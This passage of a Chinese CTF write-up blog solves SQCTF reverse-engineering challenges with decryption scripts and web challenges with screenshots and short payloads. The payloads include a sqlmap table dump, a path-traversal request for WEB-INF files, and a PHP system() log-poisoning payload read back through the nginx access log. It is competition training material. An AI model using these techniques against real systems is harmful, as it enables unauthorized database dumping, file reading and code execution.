<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_decrypt</span>(<span class="params">block, key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    解密一个 64 位块（由两个 32 位无符号整数组成），</span></span><br><span class="line"><span class="string">    使用标准的 TEA 解密算法（32 轮，采用小端序）。</span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">      block -- 长度为8的字节串</span></span><br><span class="line"><span class="string">      key   -- 长度为4的无符号整数列表</span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">      解密后的两个 32 位整数组成的列表</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 从 block 中读取两个 32 位整数 (小端格式)</span></span><br><span class="line">    v0, v1 = struct.unpack(<span class="string">&quot;&lt;II&quot;</span>, block)</span><br><span class="line">    delta = <span class="number">0x9e3779b9</span></span><br><span class="line">    <span class="comment"># 初始和 = delta * 32 (注意使用无符号32位运算)</span></span><br><span class="line">    s = (delta * <span class="number">32</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        <span class="comment"># TEA 解密轮：先解 v1，再解 v0，均做 32 位无符号运算</span></span><br><span class="line">        v1 = (v1 - (((v0 &lt;&lt; <span class="number">4</span>) + key[<span class="number">2</span>]) ^ (v0 + s) ^ ((v0 &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>]))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        v0 = (v0 - (((v1 &lt;&lt; <span class="number">4</span>) + key[<span class="number">0</span>]) ^ (v1 + s) ^ ((v1 &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        s = (s - delta) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> v0, v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_padding</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    根据 sub_102 的处理，将 data 按照最后一个字符的数值去掉对应数量的填充。</span></span><br><span class="line"><span class="string">    例如，若最后一个字节的值为 n，则有效数据长度为 len(data)-n</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># data 是字节数组，取最后一个字节做为填充数</span></span><br><span class="line">    pad = data[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> pad &gt; <span class="number">0</span> <span class="keyword">and</span> pad &lt;= <span class="built_in">len</span>(data):</span><br><span class="line">        <span class="keyword">return</span> data[:-pad]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_transform</span>(<span class="params">data, key_val</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    对 data 中的每个字节进行 XOR 变换。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(b ^ key_val <span class="keyword">for</span> b <span class="keyword">in</span> data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 原始硬编码的十六进制字符串</span></span><br><span class="line">    hex_string = <span class="string">&quot;7f1f17fd8e51aa660b8036914a4950e8fa8078a2ef33608650fb7a845226f2d1&quot;</span></span><br><span class="line">    <span class="comment"># 转换为二进制数据（字节数组）</span></span><br><span class="line">    data = <span class="built_in">bytearray</span>.fromhex(hex_string)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># TEA 密钥（注意：负数转化为对应的无符号 32 位数）</span></span><br><span class="line">    key = [</span><br><span class="line">        <span class="number">0x12345678</span>,           <span class="comment"># 305419896</span></span><br><span class="line">        <span class="number">0x87654321</span>,           <span class="comment"># 2271560481 (原 -2023406815 转无符号)</span></span><br><span class="line">        <span class="number">0xABCDEF98</span>,           <span class="comment"># 2882400152 (原 -1412567144 转无符号)</span></span><br><span class="line">        <span class="number">2566839482</span>            <span class="comment"># 4294967296 - 1728127814 = 2566839482</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 分块解密，每 8 字节解密一次</span></span><br><span class="line">    decrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">8</span>):</span><br><span class="line">        block = data[i:i+<span class="number">8</span>]</span><br><span class="line">        <span class="comment"># 如果不足8个字节则不处理（或补足，视实际加密时填充方式而定）</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(block) &lt; <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        v0, v1 = tea_decrypt(block, key)</span><br><span class="line">        <span class="comment"># 将解密后的整数以小端格式转换回字节并追加到 decrypted 中</span></span><br><span class="line">        decrypted.extend(struct.pack(<span class="string">&quot;&lt;II&quot;</span>, v0, v1))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 调用 sub_102 的处理：根据最后一个字节（padding 数量）截断字符串</span></span><br><span class="line">    decrypted = remove_padding(decrypted)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 最后对每个字节进行 XOR 操作（key = 22）</span></span><br><span class="line">    final = xor_transform(decrypted, <span class="number">22</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 输出最终结果（假设为 UTF-8 编码的文本）</span></span><br><span class="line">        <span class="built_in">print</span>(final.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="comment"># 若解码失败则以十六进制形式显示</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;解密后的数据非文本，十六进制表示：&quot;</span>, final.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment"># SQCTF&#123;nihaobuhaobuhaoxixi&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="人生自古谁无死"><a href="#人生自古谁无死" class="headerlink" title="人生自古谁无死"></a>人生自古谁无死</h3><p>无壳，直接扔IDA</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-38.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-39.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-40.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-41.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-42.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-43.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成密钥</span></span><br><span class="line">g_obf2 = [<span class="number">0xDE</span>, <span class="number">0xAD</span>, <span class="number">0xBE</span>, <span class="number">0xEF</span>]</span><br><span class="line">key = <span class="built_in">bytes</span>([(g_obf2[i % <span class="number">4</span>] ^ (i + <span class="number">17</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成Nonce（12字节）</span></span><br><span class="line">nonce = <span class="built_in">bytes</span>([<span class="number">17</span> * j <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取加密文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ciphertext1 = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;2.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ciphertext2 = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用ChaCha20解密</span></span><br><span class="line">cipher1 = ChaCha20.new(key=key, nonce=nonce)</span><br><span class="line">plaintext1 = cipher1.decrypt(ciphertext1)</span><br><span class="line"></span><br><span class="line">cipher2 = ChaCha20.new(key=key, nonce=nonce)</span><br><span class="line">plaintext2 = cipher2.decrypt(ciphertext2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag 1:&quot;</span>, plaintext1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag 2:&quot;</span>, plaintext2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Flag 1: b&#x27;\xab\xd1k\xdb)\xa1\xd1\xfe\x01\x05\x7f\tj\xfb\xccX|\xc0\xde&#125;\x185\xb3f\x8a9\x89\xf5\xf3\x93&#x27;</span></span><br><span class="line"><span class="comment"># Flag 2: b&#x27;SQCTF&#123;real_chacha20_flag&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h3 id="不劳春风解我忧"><a href="#不劳春风解我忧" class="headerlink" title="不劳春风解我忧"></a>不劳春风解我忧</h3><p>无壳，直接扔IDA<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-44.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-45.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-46.png"></p>
<p>一个XXTEA算法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">xxtea_decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    XXTEA 解密算法实现</span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">      v: list[int]，待解密的数据（32 位无符号整数列表）</span></span><br><span class="line"><span class="string">      k: list[int]，密钥（4 个32位无符号整数）</span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">      解密后的 32 位整数列表</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> v</span><br><span class="line">    delta = <span class="number">0x9e3779b9</span></span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    sum_val = (rounds * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">while</span> sum_val != <span class="number">0</span>:</span><br><span class="line">        e = (sum_val &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            y = v[(p + <span class="number">1</span>) % n]</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            <span class="comment"># 与加密中相反的逆向操作</span></span><br><span class="line">            f = (((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((sum_val ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z))</span><br><span class="line">            v[p] = (v[p] - f) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        sum_val = (sum_val - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uint32_array_to_bytes</span>(<span class="params">arr, length</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将32位无符号整数数组转换成 bytes 字节串（little-endian），</span></span><br><span class="line"><span class="string">    并截取指定长度</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    b = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> arr:</span><br><span class="line">        b.extend(x.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(b[:length])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 固定的密钥，与 C 代码中的完全一致</span></span><br><span class="line">    key = [<span class="number">0x12345678</span>, <span class="number">0x9ABCDEF0</span>, <span class="number">0xFEDCBA98</span>, <span class="number">0x87654321</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 给定密文（加密后目标结果），注意需要转换为无符号 32 位整数表示：</span></span><br><span class="line">    <span class="comment"># -1888188061 对应为: (-1888188061) &amp; 0xFFFFFFFF</span></span><br><span class="line">    <span class="comment"># -887253336  对应为: (-887253336) &amp; 0xFFFFFFFF</span></span><br><span class="line">    cipher0 = (-<span class="number">1888188061</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    cipher1 = (-<span class="number">887253336</span>)  &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    cipher = [cipher0, cipher1]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对密文进行逆向 XXTEA 解密</span></span><br><span class="line">    decrypted = xxtea_decrypt(cipher.copy(), key)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 根据 C 代码，原始数据是存储在 8 字节内（2 个32位整数），</span></span><br><span class="line">    <span class="comment"># 如果末尾有补 0，则移除尾部的多余的0字节</span></span><br><span class="line">    plaintext_bytes = uint32_array_to_bytes(decrypted, <span class="number">8</span>).rstrip(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        plaintext_str = plaintext_bytes.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        plaintext_str = plaintext_bytes.decode(<span class="string">&#x27;latin-1&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Decrypted flag:&quot;</span>, plaintext_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment"># Decrypted flag: tyandctf</span></span><br></pre></td></tr></table></figure>

<p>flag为：<code>SQCTF&#123;tyandctf&#125;</code></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezGame"><a href="#ezGame" class="headerlink" title="ezGame"></a>ezGame</h3><p><code>Ctrl+U</code>查看源代码，看到了获得flag的请求函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-47.png"></p>
<p>传参2048就能获得flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-48.png"></p>
<h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-49.png"></p>
<h3 id="File-download"><a href="#File-download" class="headerlink" title="File_download"></a>File_download</h3><p>随便访问一个路径查看报错信息可以看到是tomcat的站点</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-50.png"></p>
<p>根据提示传对应的参数，发现可以读取当前目录下的文件，但是不能直接读flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-51.png"></p>
<p><code>GET传参会显示在页面，POST则直接下载文件</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-52.png"></p>
<p>参数读取<code>tomcat</code>的配置文件<code>WEB-INF/web.xml</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-53.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-54.png"></p>
<p>从上面的信息来看知道源码<code>class</code>文件位置在<code>WEB-INF/classes/com/ctf/flag/FlagManager.class</code></p>
<p>POST请求：<code>/DownloadServlet?filename=WEB-INF/classes/com/ctf/flag/FlagManager.class</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 逆向该class文件获取里面的key</span></span><br><span class="line"></span><br><span class="line">key = [<span class="number">110</span>, <span class="number">107</span>, <span class="number">185</span>, <span class="number">183</span>, <span class="number">183</span>, <span class="number">186</span>, <span class="number">103</span>, <span class="number">185</span>, <span class="number">99</span>, <span class="number">105</span>, <span class="number">105</span>, <span class="number">187</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">102</span>, <span class="number">184</span>, <span class="number">185</span>, <span class="number">103</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">186</span>, <span class="number">107</span>, <span class="number">187</span>, <span class="number">99</span>, <span class="number">183</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">184</span>, <span class="number">102</span>, <span class="number">106</span>, <span class="number">106</span>, <span class="number">188</span>, <span class="number">109</span>, <span class="number">186</span>, <span class="number">111</span>, <span class="number">188</span>]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> key:</span><br><span class="line">    temp = k ^ <span class="number">0x30</span></span><br><span class="line">    c = temp -<span class="number">38</span></span><br><span class="line">    flag.append(<span class="built_in">chr</span>(c))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line"><span class="comment"># 85caad1c-33e3-0bc1-6d5e-a73b044f7d9f</span></span><br></pre></td></tr></table></figure>



<h3 id="商师一日游"><a href="#商师一日游" class="headerlink" title="商师一日游"></a>商师一日游</h3><p>第一关：直接访问<code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;/atc1acrd.html&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">然后</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;Ctrl+U&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">查看源码</font></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-55.png"></p>
<p>第二关：<code>/atc2cnzd.php</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-56.png"></p>
<p>第三关：<code>&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgb(245, 245, 220);&quot;&gt;/atc3oklm.php&lt;/font&gt;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-57.png"></p>
<p>第四关：<code>/atc4zztg.php</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-58.png"></p>
<p>第五关：<code>/atc5uupl.php</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-59.png"></p>
<p>第六关：<code>&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgb(245, 245, 220);&quot;&gt;/atc6ertg.php&lt;/font&gt;</code></p>
<p><font style="color:rgb(0, 0, 0);background-color:rgb(245, 245, 220);">查看页面源码找到隐藏的按钮</font></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-60.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-61.png"></p>
<p>第七关：<code>/atc7wedf.php</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-62.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-63.png"></p>
<p>合并flag提交即可</p>
<h3 id="小小查询系统"><a href="#小小查询系统" class="headerlink" title="小小查询系统"></a>小小查询系统</h3><p>sqlmap直接梭哈</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://challenge.qsnctf.com:<span class="number">30726</span>/?<span class="built_in">id</span>=<span class="number">1</span> -D ctf -T flag --dump</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-64.png"></p>
<h3 id="baby-include"><a href="#baby-include" class="headerlink" title="baby include"></a>baby include</h3><p>先用<code>Yakit</code>访问一下<code>/&lt;?php system(&#39;cat flag.php&#39;) ?&gt;</code>（直接访问会把特殊符号编码）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-65.png"></p>
<p>然后用<code>file://</code>协议读取nginx的日志文件<code>/var/log/nginx/access.log</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-66.png"></p>
<h3 id="Input-a-number"><a href="#Input-a-number" class="headerlink" title="Input a number"></a>Input a number</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-67.png"></p>
<h3 id="唯一"><a href="#唯一" class="headerlink" title="唯一"></a>唯一</h3><p>先用<code>arjun</code>fuzzc出参数<code>note</code></p>
